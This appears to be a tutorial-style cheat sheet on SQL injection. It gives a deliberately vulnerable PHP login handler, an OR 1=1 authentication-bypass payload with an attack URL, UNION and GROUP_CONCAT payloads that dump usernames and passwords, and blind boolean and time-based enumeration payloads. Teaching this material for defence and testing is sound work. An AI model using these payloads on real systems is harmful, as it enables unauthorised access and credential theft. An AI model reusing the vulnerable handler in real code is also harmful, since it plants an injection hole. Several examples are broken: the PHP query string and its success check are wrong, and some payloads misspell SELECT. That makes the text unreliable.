
# SQL Injection (SQLi)


## About

This is one of the most sever vulnerabilities that web applications can face. An attacker can abuse misconfigured forms to bypass authentication page or to query databases in order to exfiltrate their content, etc..

>Note that we will not discuss how SQL work, we highly recommend to study that first.

---
## How it works ?

When the website receives our filled parameters, either by `GET` or `POST` requests, it will put these variables in a pre-prepared *query statement*. Then, it will execute this statement in the database and retrieves the result back. Finally, it will do some action according to the received result.

Here is a vulnerable authentication handler code in PHP and MySQL database:
```PHP
<? php  
$servername = 'localhost';
$username = 'username';
$password = 'password';
$dbname = 'myDB';  
  
// Create connection  
$conn = new mysqli($servername, $username, $password, $dbname);

// Prpare the statment
$sql = 'SELECT id FROM users where username='.$_GET['username'].'and password='.$_GET['password'];

// Execute the statment
$result = $conn->query($sql);

// Successful query check
if($result === TRUE)
{
	echo 'You logged in !';
}
?>
```
The vulnerability occurs when there is not filtration on our input, and developer blindly trusts it. We can then simply bypass this check by making the statement returns `TRUE` . **Here are the steps to do that:**
1. End the string using single quote `'` . You can put any junk data before the `'` if you want. Example: `bb'`
2. Put a `TRUE` returned statement using `OR` logical operator. Example: `OR 1=1` .
3. Comment the rest of the query. Usually we don't know the database type used in the app, so keep trying all possible syntaxes until you get a hit. Example: `-- //`

The final payload for our case is :
```SQL
bb' OR 1=1 -- //
```

You can now bypass that app like this:
```
https://company.com/login.php?username=bb'%20OR%201=1%20--%20//&password=JUNK_JUNK
```

> Note the usage of `%20`, because we can't put any spaces in URLs.

In the background, the app will execute this statement:
```SQL
SELECT id FROM users where username='bb' OR 1=1 -- // and password='JUNK_JUNK'
```


---
## Functions and Keywords to know

##### `UNION`
- This is a keyword in SQL that lets you add another select statement in your payload.
- **Form:** It takes *n*<sup>th</sup> comma (`,`) separated values that is to be rendered to the screen. Where *n* is the number of columns.
- **Example:** `bb' UNION SELECT 1,2,3 ;--` .


##### `group_concat`
- This is a *function* in SQL used within the `SELECT` statement to return all of the rows into one string. It makes it easier to read.
- **Examples:**
```SQL
SELECT group_concat(username) FROM users;`
```

If we want to do multiple parameters like this:
```SQL
SELECT group_concat(username || ':' || password) FROM users;
```
We use the `||` symbol as a concatenation. We put any thing we want between the `username` and `password` fields within each record to separate them from each other. It will output something like this: `mike:pass123,john:pass456` .

Or, we can also use this syntax 
```SQL
SELECT GROUP_CONCAT(username,':',password SEPARATOR '<br>') FROM users
```
We've also added `;` to split the username and password from each other. Instead of being separated by a comma, we've chosen the HTML `<br>` tag that forces each result to be on a separate line to make for easier reading.


- **In payload form:**
	- At the ends .
```
bb" UNION SLECET 1, 2, GROUP_CONCAT(username,':',password SEPARATOR '<br>') FROM users -- //
```

	- At the middle .
```
bb" UNION SLECET 1, (SELECT GROUP_CONCAT(username || ':' || password) FROM users), 3, 4 -- //
```


##### `database()`
- This *function* returns the database name that this query has executed in.
- **Example:** `bb' UNION SELECT 1,database(),3 ;--` .

---
## Enumerating the Database

Each database has a built-in tables that contains all of the table_names and column_names in each table within a given database. It us called `information_schema`.

**Enumerate the tables**

```SQL
SELECT table_name, table_schema FROM information_schema.tables;
```
*table_schema* is the DB name that this table belongs to.


**Enumerate the columns**

```SQL
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
```
*We assume that we have a table named "users"*.


---
## SQL Injection Types

There are many types and forms of SQL injection. Each of them differ in the technique used to exploit them. Will present some of them here:
- **In-Band:** It is the easiest form to exploit, it renders the result of the query on the same page.

- **Blind - Boolean based:** This type doesn't show you the result of the query. It does some action based on the result, whether is *true* or *false*. We will abuse this by relying on the behavior performed by the server to know if our injected payload is correct or not.

For example, if we want to enumerate the database name, we will be bruteforcing it letter by letter until we get a hit, or no hit; which means that only discovered letters are the name of the database.
```
bb' UNION SELECT 1,2,3 where database() like 's%';--
```
*Note the usage of `like` statement to check which letter satisfice the condition*.

Another example is we might try to discover a table name in a given db.
```
bb' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'MY_DB' and table_name like 'a%';--
```


- **Blind - Time Based:** It is like the *Boolean-based*, there is no sign to tell us if our payload is correct. But what we can do is, sending the `SLEEP()` method in our payload. If the webpage is delayed some seconds, then our payload is correct, otherwise *false*.
```
bb' UNION SELECT SLEEP(5),2 where database() like 'u%';--
```

---
## Notes

- The input might be expected to be an integer sometimes, so no need to put the single-quote `'` at the beginning of the payload, because there is no string to end.
- There are many filtration happens usually on special characters, review online cheatsheets to bypass it.
- Try always every field to detect if there is a SQLi vulnerability. like using the signal quote `'`.
- Try to know what DB type are you dealing with, because each type has it own functions.
- You need to always try and try you payloads. SQL Injection exploitation process evolves many trial and errors.